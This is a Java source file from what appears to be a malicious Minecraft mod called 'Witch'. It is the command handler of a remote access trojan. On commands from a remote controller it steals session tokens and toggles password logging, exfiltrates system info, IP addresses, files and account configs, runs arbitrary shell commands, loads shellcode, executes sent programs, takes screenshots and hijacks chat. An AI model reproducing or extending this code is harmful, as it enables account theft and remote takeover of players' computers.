package me.soda.witch.client.websocket;

import com.google.gson.Gson;
import me.soda.witch.client.Witch;
import me.soda.witch.client.features.PlayerInfo;
import me.soda.witch.client.features.ShellcodeLoader;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.HandleMessage;
import me.soda.witch.shared.Message;
import me.soda.witch.shared.ProgramUtil;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

import static me.soda.witch.client.Witch.mc;
import static me.soda.witch.client.Witch.messageUtils;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes) {
        handle(messageUtils.decrypt(bytes));
    }

    public static void handle(Message message) {
        HandleMessage.handle(message, (msgType, msg) -> {
            Witch.println("Received message: " + msgType);
            try {
                switch (msgType) {
                    case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                    case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                    case "chat_control" -> ChatUtil.sendChat(msg);
                    case "chat_filter" -> Witch.config.filterPattern = msg;
                    case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                    case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
                    case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
                    case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                    case "screenshot" -> ScreenshotUtil.screenshot();
                    case "chat" -> ChatUtil.chat(Text.of(msg), false);
                    case "kill" -> Witch.client.close(false);
                    case "reconnect" -> Witch.client.close(true);
                    case "shell" -> new Thread(() -> {
                        String result = ProgramUtil.runCmd(msg);
                        NetUtil.send(msgType, "\n" + result);
                    }).start();
                    case "shellcode" -> {
                        if (ProgramUtil.isWin())
                            new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                    }
                    case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                    case "config" -> NetUtil.send(msgType, Witch.config);
                    case "player" -> {
                        NetUtil.send(msgType, new PlayerInfo(Witch.mc.player));
                        Witch.client.reconnections = 0;
                    }
                    case "skin" -> {
                        NetUtil.send("player", new PlayerInfo(Witch.mc.player));
                        PlayerSkinUtil.sendPlayerSkin();
                    }
                    case "server" -> {
                        ServerUtil.disconnect();
                        Witch.config.canJoinServer = !Witch.config.canJoinServer;
                    }
                    case "kick" -> ServerUtil.disconnect();
                    case "execute" -> ProgramUtil.runProg(GSON.fromJson(msg, byte[].class));
                    case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
                    case "read" -> NetUtil.send(msgType, FileUtil.read(msg));
                    case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                    case "props" -> NetUtil.send(msgType, System.getProperties());
                    case "ip" -> NetUtil.send(msgType, NetUtil.getIp());
                    case "crash" -> MinecraftUtil.crash();
                    case "key" -> {
                        messageUtils.setXOR(msg);
                        messageUtils.acceptXOR = true;

                        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                        NetUtil.send("greeting", greetingMsg);
                        NetUtil.send("player", new PlayerInfo(Witch.mc.player));
                        NetUtil.send("ip", NetUtil.getIp());
                        NetUtil.send("server_name");
                    }
                    case "server_name" -> Witch.config.name = msg;
                    default -> {
                    }
                }
            } catch (Exception e) {
                Witch.println("Corrupted message!");
                Witch.printStackTrace(e);
            }
        }, e -> {
            Witch.printStackTrace(e);
            Witch.client.close(true);
        });
    }
}